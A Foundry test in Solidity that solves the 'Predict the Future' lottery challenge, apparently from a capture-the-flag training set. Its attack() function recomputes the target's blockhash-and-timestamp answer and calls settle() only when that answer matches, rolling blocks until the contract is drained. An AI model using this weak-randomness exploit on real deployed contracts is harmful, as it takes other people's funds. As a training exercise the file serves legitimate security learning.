// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "source/lotteries/PredictTheFuture.sol";

contract PredictTheFuture is Test {

  PredictTheFutureChallenge predictTheFutureChallenge;

  address account1;
  address account2;
  uint8   answer;

  function setUp() public {
    account1 = vm.addr(1);
    vm.label(account1, "Account1[address]");
    vm.deal(account1, 10 ether);

    predictTheFutureChallenge = new PredictTheFutureChallenge{value: 1 ether}();
    vm.label(address(predictTheFutureChallenge), "PredictTheFutureChallenge[contract]");
    vm.startPrank(account1);

    //console.log(address(predictTheFutureChallenge));
    //console.log(answer);
  }

  function attack(uint8 guess) public payable returns (bool success) {
    // here we are going to attach by front running until we get a result that is equal to the guess argument
    // we run the same code as the target contract calling settle on the target when we have the correct answer
    answer = uint8(
              uint256(
                  keccak256(abi.encodePacked( blockhash(block.number - 1), block.timestamp))
              )
            ) % 10;
            if (answer == guess) {
                predictTheFutureChallenge.settle();
                return true;
            } else {
                return false;
            }
  }

  function testCorrectGuess() public {
    uint8 guess = 9;

    // correct guess, costs 1 ether, returns 2
    vm.roll(10);

    // lock in the guess value
    predictTheFutureChallenge.lockInGuess{value: 1 ether}(guess);

    // attach until true, if false roll forward
    while ( !attack(guess) ) { vm.roll(block.number +1); }

    // assert results and correct eth values
    uint expectedAccountBalance = 11 * (1 ether);
    assertEq((account1.balance), expectedAccountBalance );
    uint expectedContractBalance = 0;
    assertEq(address(predictTheFutureChallenge).balance, expectedContractBalance );

    bool complete = predictTheFutureChallenge.isComplete();
    assertTrue(complete);

    // log results, a sanity check
    console.log(answer);
    console.log(account1.balance);
    console.log(address(predictTheFutureChallenge).balance);
    console.log(complete);
  }

  fallback() external payable { }
  receive() external payable { }
}

